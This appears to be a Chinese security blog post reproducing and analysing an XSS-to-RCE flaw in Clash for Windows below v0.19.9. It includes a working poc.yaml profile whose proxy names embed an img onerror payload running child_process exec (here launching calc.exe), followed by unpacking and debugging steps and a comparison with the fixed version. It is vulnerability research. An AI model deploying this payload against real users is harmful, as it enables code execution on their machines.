@@ -1,0 +1,56 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【漏洞复现】clash <v0.19.8 rce</title><meta name="description" content="&lt;p&gt;影响版本&lt;/p&gt;
+&lt;p&gt;Windows v0.19.9版本以下&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【漏洞复现】clash <v0.19.8 rce</h3><div class="article__date metadata"><div class="post-info">2022/04/10</div></div><div class="article__tags metadata">Tags:
+<a class="article__tags__link metadata" href="/tags/cve/">cve</a><a class="article__tags__link metadata" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="article__body"><p>影响版本</p>
+<p>Windows v0.19.9版本以下</p>
+<span id="more"></span>
+<h2 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现"></a> 漏洞复现</h2>
+<p>漏洞程序连接：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Fndroid/clash_for_windows_pkg/releases">https://github.com/Fndroid/clash_for_windows_pkg/releases</a></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/415f9c9b6f39188d39200cc37504315b.png" alt="image-20220409215612134" /></p>
+<p>poc.yaml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;17938&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">abc</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;8088&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在Profiles里面import导入poc后，激活</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5a2b1c56f111fec7793783dbea24d375.png" alt="image-20220409220533062" /></p>
+<p>之后启用节点(Proxies)</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/421b6767fb5d0834203f42544514d13f.png" alt="image-20220409220420927" /></p>
+<p>相关日志</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e9aee65323546cad7f66bcc35602e975.png" alt="image-20220409220505710" /></p>
+<h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h2>
+<h3 id="1使用poc进行分析"><a class="markdownIt-Anchor" href="#1使用poc进行分析"></a> 1.使用PoC进行分析</h3>
+<p>看PoC的写法是不是特别像XSS，因为偶Clash For Windows采用electron编写，使用<a target="_blank" rel="noopener" href="https://github.com/electron/asar">asar</a></p>
+<p>安装asar</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g asar</span><br></pre></td></tr></table></figure>
+<p>解包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar e app.asar app_name</span><br></pre></td></tr></table></figure>
+<p>对其进行解包后：</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9e132f2710b6b9ad2e4482e0de70e94f.png" alt="image-20220410101841003" /></p>
+<p>原作者对render采用了一定的混淆，虽然变量名混淆对分析造成了极大的干扰，但是最大的麻烦还是一行的js代码，这里可以使用 <a target="_blank" rel="noopener" href="https://beautifier.io/">https://beautifier.io/</a> 反混淆，替换掉原有的renderer.js文件</p>
+<p>打包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar pack app_name app.asar</span><br></pre></td></tr></table></figure>
+<p>之后使用<a target="_blank" rel="noopener" href="https://github.com/bytedance/debugtron">Debugtron</a>进行调试，找到前端相关的代码</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2965f7788ca6c18c6c2c4587753a57da.png" alt="image-20220410102410029" /></p>
+<p>下个断点一步步看吧</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4b4e65cb5d332b9249380e4167ffaa57.png" alt="image-20220410102520095" /></p>
+<p>这里就已经触发漏洞了</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/3634a474aede4f6a29c36ba54731009f.png" alt="image-20220410104219469" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5d857532f30b4b46206b4c9726ee0a08.png" alt="image-20220410105415507" /></p>
+<p>最终发现漏洞代码</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/787a52d83a7005a70a0f128dc59cd8ce.png" alt="image-20220410110229298" /></p>
+<p>renderer.js在加载配置文件的时候，创造元素并加载时并没有对元素进行检查或转义，从而导致XSS</p>
+<p>然后XSS中，利用 img 元素的报错处理实现RCE</p>
+<h3 id="2版本对比分析"><a class="markdownIt-Anchor" href="#2版本对比分析"></a> 2.版本对比分析</h3>
+<p>其实后续分析时，尤其是作者已经修复漏洞的时候最应该使用这个方法。</p>
+<p>这样我们就不用一步步的调试了，但是这里采用了混淆也是不好分析。</p>
+<p>下载已修复版本，我这里使用的是 <strong>Clash.for.Windows-0.19.9-win</strong>，测了下确实没有洞</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f688c65c8f1cb246af6326c59ca6bbdf.png" alt="image-20220410110945159" /></p>
+<p>继续使用degtron进行调试</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6c6bacef458da6ad8401343abf0c67f0.png" alt="image-20220410132317281" /></p>
+<p>这里的尖括号被替换了，应该就是更新了过滤法则，直接转义成字符串了</p>
+<h2 id="挖掘思路"><a class="markdownIt-Anchor" href="#挖掘思路"></a> 挖掘思路</h2>
+<p>根据上面的分析，怀疑是漏洞挖掘者通过测试<code>.yaml</code>配置文件测试出来的xss，进一步导致rce</p>
+<h2 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h2>
+<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/02/28/clash%20for%20windows%20rce/">http://www.yongsheng.site/2022/02/28/clash for windows rce/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/electron/asar">https://github.com/electron/asar</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/debugtron">https://github.com/bytedance/debugtron</a></p>
+</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2022/04/11/sudo-fuzz2exp-1/">prev_post</a><a class="pagination__link pagination__next" href="/2022/04/01/spring4shell/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
